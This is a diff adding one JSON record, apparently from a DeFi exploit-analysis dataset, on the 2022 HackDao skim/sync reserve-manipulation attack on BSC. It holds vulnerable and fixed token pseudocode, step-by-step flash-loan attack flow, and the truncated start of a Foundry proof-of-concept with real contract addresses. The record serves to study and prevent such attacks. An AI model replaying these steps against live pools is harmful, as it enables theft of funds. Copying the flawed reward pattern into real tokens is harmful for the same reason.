@@ -1,0 +1,37 @@
+{
+ "id": "2022__2022-05-26_HackDao_SkimSyncPriceManipulation",
+ "source_file": "2022/2022-05-26_HackDao_SkimSyncPriceManipulation.md",
+ "title": "HackDao — skim/sync Pool Reserve Manipulation Attack Analysis",
+ "date": "2022-05-26",
+ "protocol": "HackDao",
+ "chain": "BSC",
+ "loss_raw": "~$41,000 (profit based on 1,900 WBNB flash loan)",
+ "loss_usd": 41000.0,
+ "root_cause": "Exploited the phenomenon where LP balances grow larger than reserves due to automatic rewards upon HACK token transfer, extracting profit by repeatedly calling `skim()`/`sync()`",
+ "attack_tx": "Block 18,073,756",
+ "vulnerable_contract": "HackDao/WBNB Pair 0xcd4CDAa8e96ad88D82EABDdAe6b9857c010f4Ef2",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable HACK token auto-reward mechanism (pseudocode)\ncontract HackDaoToken {\n    address[] public rewardPools; // list of pools receiving rewards\n\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        //",
+  "❌ Automatically distributes reward tokens to LP pools on transfer\n        uint256 reward = amount * 5 / 100; // 5% reward\n        for (uint i = 0; i < rewardPools.length; i++) {\n            // Adds directly to pool address balance → causes mismatch with reserve\n            _balances[rewardPools[i]] += reward / rewardPools.length;\n        }\n        _balances[sender] -= amount;\n        _balances[recipient] += amount - reward;\n    }\n}\n\n// Uniswap V2 skim():\n// function skim(address to) external lock {\n//     uint excess0 = IERC20(token0).balanceOf(address(this)) - reserve0;\n//     uint excess1 = IERC20(token1).balanceOf(address(this)) - reserve1;\n//     if (excess0 > 0) safeTransfer(token0, to, excess0); //",
+  "❌ extracts excess\n//     if (excess1 > 0) safeTransfer(token1, to, excess1);\n// }\n//\n// sync():\n// function sync() external lock {\n//     reserve0 = IERC20(token0).balanceOf(address(this)); // updates reserve\n//     reserve1 = IERC20(token1).balanceOf(address(this));\n// }\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct pattern\n// Accumulate reward tokens in a separate distribution contract instead of sending directly to pool address\ncontract HackDaoFixed {\n    address public rewardDistributor; // separate reward distributor\n\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        uint256 reward = amount * 5 / 100;\n        //",
+  "✅ Send to distributor contract instead of directly to pool address\n        _balances[rewardDistributor] += reward;\n        _balances[sender] -= amount;\n        _balances[recipient] += amount - reward;\n    }\n}"
+ ],
+ "steps": [
+  "Swap WBNB → HACK (Pair1: HackDao/WBNB)",
+  "1,900 WBNB → obtain large amount of HACK tokens",
+  "⚡ Auto-reward on swap → HACK added to each pool",
+  "balance > reserve → extract excess",
+  "⚡ Reward on transfer → Pair2 balance increases",
+  "Pair1.swap(): swap held HACK → WBNB (realize profit)"
+ ],
+ "other_code": [
+  "Attacker\n    │\n    ├─[1] DODO Flash Loan: borrow 1,900 WBNB\n    │       IDODOFlashLoan(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4)\n    │       .flashLoan(1900 WBNB, 0, ...)\n    │\n    ├─[2] [Inside DPPFlashLoanCall callback]\n    │       │\n    │       ├─ Swap WBNB → HACK (Pair1: HackDao/WBNB)\n    │       │       1,900 WBNB → obtain large amount of HACK tokens\n    │       │       ⚡ Auto-reward on swap → HACK added to each pool\n    │       │\n    │       ├─ Pair1.skim(address(this)): receive excess HACK\n    │       │       balance > reserve → extract excess\n    │       │\n    │       ├─ Transfer HACK to Pair2 (HackDao/USDT)\n    │       │       ⚡ Reward on transfer → Pair2 balance increases\n    │       │\n    │       ├─ Pair2.skim(address(this)): receive excess HACK\n    │       │\n    │       ├─ Pa",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IDODO {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external;\n}\n\ninterface IPancakePair {\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract ContractTest is Test {\n    IERC20 WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 HACK   = IERC20(0x94e06c77b02Ade8341489Ab9A23451F68c13eC1C);\n    IDODO  dodo   = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);\n\n    // Hack"
+ ]
+}
